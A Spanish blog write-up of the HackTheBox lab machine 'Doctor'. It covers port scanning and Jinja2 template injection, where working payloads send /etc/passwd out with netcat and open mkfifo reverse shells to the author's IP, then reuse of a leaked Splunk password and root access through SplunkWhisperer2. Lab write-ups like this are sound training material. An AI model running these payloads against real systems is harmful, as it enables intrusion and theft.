---
layout      : post
title       : "HackTheBox - Doctor"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png
category    : [ htb ]
tags        : [ SSTI, logs, splunk ]

---
Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos `Splunk` montando servidores fake por todos lados para ejecutar comandos.

![doctorHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/doctorHTB.png)

### TL;DR (Spanish writeup)

Creador: [egotisticalSW](https://www.hackthebox.eu/profile/94858).

Bueno bueno, inicio caótico, empezaremos jugando con el archivo `/etc/hosts`, encontraremos un login panel que está siendo ejecutado con la librería `Werkzeug` de `Python`. Después nos percataremos de una inyección por templates (`Server Side Template Injection`), en este caso el marco `Jinja2`. Usaremos esto para ejecutar comandos en el sistema como el usuario `web`, así mismo obtendremos una reverse Shell (:

Estando dentro y enumerando los logs de la máquina nos encontraremos con una contraseña para un servicio que tenemos en el puerto `8089` (Splunk) y su usuario `shaun` (que también es usuario del sistema). Con esa contraseña tendremos acceso a la máquina y al servicio, 2x1 :)

En internet nos encontraremos con un exploit que aprovecha la creación de un servidor falso en nuestra máquina para ejecutar comandos mediante el servicio `Splunk`. Con él obtendremos una Shell como el usuario `root`.

He creado un script para la generación del usuario en la web, nos logea, crea el post malicioso y hace el despliegue de la Reverse Shell. Hechenle un ojito si quieren ;)

* [createuserdoctors.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/doctor/createuserdoctors.py)

...

#### Clasificación de la máquina.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Neutral con puntos reales.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

### Fases

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.

```bash
–» nmap -p- --open -v 10.10.10.209
```

En este caso vamos a agregarle el parametro `-T` para hacer el escaneo más rapido.

```bash
–» nmap -p- --open -v -T5 10.10.10.209
```

Aún sigue lento, cambiemos el `-T` por `--min-rate`:

```bash
–» nmap -p- --open -v --min-rate=2000 10.10.10.209 -oG initScan
```

Perfecto va mucho más rapido.

> **Es importante hacer un escaneo total, sin cambios ni parametros de más, asi vaya lento, que nos permita ver si obviamos/pasamos algún puerto**. 
> ```sh
> –» nmap -p- --open -v -Pn 10.10.10.203 -oG totalScan
> ```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -Pn        | Evita que realice Host Discovery, como **ping** (P) y el **DNS** (n)                                     |
| -T         | Forma de escanear super rapido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al número que pongamos                                   |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Wed Dec  9 25:25:25 2020 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10.10.10.209
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.209 ()   Status: Up
Host: 10.10.10.209 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: filtered (65533)
# Nmap done at Wed Dec  9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 91.31 seconds
```

Muy bien, tenemos los siguientes servicios:

| Puerto | Descripción   |
| ------ | :------------ |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexion remota segura mediante una shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web |

Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,80 -sC -sV 10.10.10.209 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Wed Dec  9 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19.24 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu |
| 80     | HTTP     | Apache httpd 2.4.41  |

...

El escaneo total (totalScan) me mostro un nuevo puerto y el tipo de servicio era `unknown`, haciendo el escaneo de versiones y scripts, obtuvimos:

```bash
...
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Descripción   |
| ------ | :------------ |
| 8089   | **[Splunk](https://es.wikipedia.org/wiki/Splunk)**: Realiza busqueda, analisis y monitoreo de macrodatos, todo mediante una interfaz grafica |

Pero validando en la web `http://10.10.10.209:8089/` sale error, posiblemente por el `SSL`, sigamos validando a ver que encontramos.

...

#### • Puerto 80 [⌖](#puerto-80) {#puerto-80}

![278pagedoctordefault](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctordefault.png)

Enumeremos a ver que podemos encontrar...

```bash
–» cat webScan 
# Nmap 7.80 scan initiated Wed Dec  9 10:34:55 2020 as: nmap -p 80 --script=http-enum -oN webScan 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.19s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

# Nmap done at Wed Dec  9 10:35:25 2020 -- 1 IP address (1 host up) scanned in 30.40 seconds
```

Realizando un fuzz de directorios con nmap, mediante el script `http-enum` no vemos rutas escondidas u ocultas... Sigamos.

Encontramos:

* Posible dominio: `doctors.htb`
* Posibles usuarios: `Jade Guzman`, `Hannan Ford`, `James Wilson` y `Admin`.

Probemos colocando en el `/etc/hosts` el dominio, para que cuando hagamos una petición hacia `10.10.10.209`, nos resuelva hacia `doctors.htb`.

```bash
–» cat /etc/hosts
...
10.10.10.209  doctors.htb
...
```

Ahora validemos en la web:

![278pagedoctorshtb](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorshtb.png)

Muy bien, tenemos un login panel (que tambien nos permite registrarnos) en el puerto `80`, veamos si cambio algo ahora con el nuevo puerto: `8089`.

![278pagedoctorsSSL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsSSL.png)

Perfecto, tenemos la interfaz de `splunk` con algunas rutas, 2 de ellas funcionan (nos piden usuario y contraseña para entrar) y las otras 2 pues no :P

...

Validando el login panel ninguna credencial por default es valida, usando `whatweb` nos indica:

```bash
–» whatweb http://doctors.htb/login?next=%2F
http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
```

Esta usando una libreria de `Python` llamada `[Werkzeug en su versión 1.0.1](https://werkzeug.palletsprojects.com/en/1.0.x/)` que permite entre otras cosas usar WSGI (Interfaz de puerta de enlace de un servidor web) para que los servidores reenvien solicitudes a aplicaciones web.

* Info: [Codigo Facilito / WSGI](https://codigofacilito.com/articulos/wsgi-python)

Buscando vulnerabilidades no existen aún publicas, probemos a registrarnos:

![278pagedoctorscreateuser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorscreateuser.png)

```
Your account has been created, with a time limit of twenty minutes!
```

Entramos y tenemos:

![278pagedoctorshomeauth](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorshomeauth.png)

Si hacemos un reconocimiento de directorios con [dirsearch](https://github.com/maurosoria/dirsearch) tenemos:

```bash
–» dirsearch.py -u http://doctors.htb -t 50 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt --cookie "session=.eJwlzjFuA0EIheG7TJ0CGGDAl1kxOyBbkRJp166i3N0bpXy_XvH9tK2OPO_t9jxe-dG2x2q3NgtzYBAoa7pNMfauw3Aim2o49iWLaOVwGcmBEVXQ5XpZQo9gItNIcFSB6JIyQXWH5c68rwIiqgE-S4t52aCeITWnDylpF-R15vGvoWvu51Hb8_szv64wcFo4wWRDNyfOJIfyhY5-ueKvs0T7fQMhET1g.X9EN1A.AaNm4WThP6qM6V-ogiPoLgMafAU" -q
```

| Arg | Descripción |
| :-- | :---------- |
| -t  | Hilos con los que queremos que haga el proceso |
| -q  | Para que simplemente nos muestre el reporte    |

```
302 -  217B  - http://doctors.htb/logout  ->  http://doctors.htb/home
302 -  217B  - http://doctors.htb/register  ->  http://doctors.htb/home
302 -  217B  - http://doctors.htb/login  ->  http://doctors.htb/home
200 -    3KB - http://doctors.htb/home
200 -  101B  - http://doctors.htb/archive
200 -    4KB - http://doctors.htb/account
```

Con el escaneo (y si vemos el codigo fuente (`CTRL + U`) de la pagina, vemos la referencia hacia `/archive`: 

![278pagedoctorsarchiveRfound](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsarchiveRfound.png)

Pero entrando a la ruta no obtenemos nada, simplemente una página blanca. Haciendo fuzz sobre esa ruta tampoco obtenemos nada... Revisando podemos crear posts y nos los guarda en la ruta `/user/lanz`, probando con el usuario `/admin` también tenemos respuesta, solo hay un post por parte de él:

![278pagedoctorsadminpost](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsadminpost.png)

...

Pues veamos si el apartado para crear post es vulnerable a alguna inyección.

![278pagedoctorscreatepost](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorscreatepost.png)

Después de estar demasiado tiempo estancado sin entender que debía hacer, ya que ninguna inyección me mostraba algo y tampoco me funcionaban las típicas sentencias blind. Me fui para el foro de la máquina, alguien decía que es una inyección extraña que trata sobre `Templates` (ya que habían muchas dudas sobre si era `SQLi`). También hablaban de `AllTheThings`, lo cual me trajo a la mente un repositorio gigante de payloads para probar, lo busque y lo encontré: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

Primero busqué en internet `Template injection` y el resultado fue `Server Side Template Injection` (SSTi). 

> "Template engines are widely used by web applications to present dynamic data via web pages and emails." [Portswigger](https://portswigger.net/research/server-side-template-injection)

Profundizando encontré [que dependiendo el lenguaje de programación, existen tipos de Templates, por lo tanto, diferentes tipos de explotación](https://gupta-bless.medium.com/exploiting-server-side-template-injection-96d538e38539), probando y tomando en cuenta que estamos corriendo una librería de `Python` podemos tener los siguientes Templates, **Jinja2, Django, Mako**.

...

## Explotación [#](#explotacion) {#explotacion}

Pero testeando con la página no veía ningún indicio de que algo estuviera pasando al [probar los 3 tipos](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). Entre de nuevo en "no sé que probar", de un momento a otro recordé a `/archive` (la rua que habíamos encontrado en el fuzz y como comentario en el código HTML), así que la abrí. 

En ese momento había creado un post probando {% raw %}`{{7*7}}`{% endraw %}, el cual si veíamos en algún lado el número `49`, quiere decir que tendríamos nuestra inyección con `Jinja2`.

![278pagedoctorsnewpost1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsnewpost1.png)

Revisando el fuente de `/archive` encontramos lo que buscabamos (:

![278pagedoctors_injA_found](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_found.png)

Bien, al probar los dos campos del `post`, el que nos genera la inyección es el titulo, asi que podemos intentar ejecución de comandos en el sistema:

* [Server Side Template Injection with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/).

![278pagedoctors_injA_idYwhoami_req](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_idYwhoami_req.png)

![278pagedoctors_injA_idYwhoami_res](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_idYwhoami_res.png)

Perfecto, tenemos ejecución de comandos en el sistema como `web`, intentemos obtener el archivo `/etc/passwd`.

Ponemos en el titulo del post:

{% raw %}
```py
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc 10.10.14.83 4433')['read']()}}
```
{% endraw %}

Nos ponemos en escucha por el puerto 4433:

```bash
–» nc -nlvp 4433
listening on [any] 4433 ...
```

Vamos a `/archive` y ejecutamos, el resultado que tenemos en consola es:

```bash
connect to [10.10.14.83] from (UNKNOWN) [10.10.10.209] 55928
root:x:0:0:root:/root:/bin/bash
...
web:x:1001:1001:,,,:/home/web:/bin/bash
...
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash 
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
```

* [Info sobre `os` y `subprocess`](https://uniwebsidad.com/libros/python/capitulo-10/modulos-de-sistema).

Listo, pues veamos como obtener una reverse shell (:

**NOTA: ---**

[Siguiendo esta guia](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee), logramos obtener el index exacto (407) de la clase [`subprocess.Popen`](https://docs.python.org/3/library/subprocess.html) :P, con el cual tambien podemos ejecutar comandos:

{% raw %}
```py
{{''.__class__.__mro__[1].__subclasses__()[407]('ls -la',shell=True,stdout=-1).communicate()}}
```
{% endraw %}

**--- :ATON**

Para conseguir la reverse shell podemos probar con `netcat`:

{% raw %}
```py
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc 10.10.14.83 4433 -e /bin/bash')['read']()}}
```
{% endraw %}

o

{% raw %}
```py
{{''.__class__.__mro__[1].__subclasses__()[407]('nc 10.10.14.83 4433 -e /bin/bash',shell=True,stdout=-1).communicate()}}
```
{% endraw %}

Pero no obtenemos respuesta, probemos con la versión antigua, pueda que esa sea la que este instalada:

{% raw %}
```py
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.83 4433 >/tmp/f')['read']()}}
```
{% endraw %}

o 

{% raw %}
```py
{{''.__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.83 4433 >/tmp/f',shell=True,stdout=-1).communicate()}}
```
{% endraw %}

Con cualquiera de las dos obtenemos la reverse sheeeeeeeeeeeeeeeeell :)

![278pagedoctors_injA_revshdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_revshdone.png)

Ahora a seguir enumerando (:

...

Cuando hicimos `id` con la inyección, vimos un grupo llamada `adm`, es interesante:

> adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. [Wiki Debian](https://wiki.debian.org/SystemGroups)

Lo siguiente nos da la razón, usando `linpeas.sh` encontramos esto en un archivo **log**:

```
/home/shaun/splunk_whisperer.py:SPLUNK_PASSWORD = "Guitar123"
```

Probemos con el puerto `8089` (donde esta el servicio `Splunk`) las credenciales: `shaun:Guitar123`.

![278pagesplunk_servicesin_shaun](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagesplunk_servicesin_shaun.png)

Perfecto, estamos dentro... 

(Casi me pasa lo mismo que con la máquina `Cache`, en la que encuentro una contraseña de otro servicio y no lo pruebo como contraseña de sistema y me pongo a enumerar y enumerar, después de tener todo ante mí :P):

```bash
web@doctor:~$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home/web$ whoami
whoami
shaun
shaun@doctor:/home/web$ id
id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
shaun@doctor:/home/web$ 
```

Listo, démosle candela pa convertirnos en root.

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Buscando en internet sobre `splunk` y sus posibles vulnerabilidades, encontramos un repositorio con un exploit interesante que crea un servidor falso en nuestra máquina, el cual hace como "ruta o comunicador" para en la mitad del proceso entrar nosotros a ejecutar comandos.

* [SplunkWhisper2](https://github.com/cnotin/SplunkWhisperer2) (versión inspirada en una que hizo [airman604](https://github.com/airman604/splunk_whisperer)).
* Lindo [articulo](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) y el cual usaremos como guía para ejecutar comandos remotamente.

Hay dos, el `local` y el `remoto`, usaremos el remoto, veamos que argumentos toma:

```py
...
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
...
```

Procedamos a cambiar a lo que tenemos:

```py
...
parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', default="10.10.10.209")
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', default="10.10.14.83")
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="shaun")
parser.add_argument('--password', default="Guitar123")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
...
```

Usaremos `--payload` en la ejecución para alojar nuestros comandos ;) Generemos una Reverse Shell de una, tomemos el mismo con el que accedimos a `web`.

```bash
–» python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.83 4434 >/tmp/f"
```

![278pagesplunk_Psy_revshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagesplunk_Psy_revshell.png)

Listos, tamos dentro, bastante sencillo, aunque antes de encontrar este exploit, estaba un toque confundido usando otras herramientas, pero bueno, una búsqueda siempre confiable con Google: `exploit splunk github`.

Veamos las flags:

![278flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278flags.png)

...

Máquina un poco traviesa al inicio, bastante sencilla la escalada, quizás para compensar el mismo inicio. 

Gracias por pasarte y a seguir rompiendo todo (: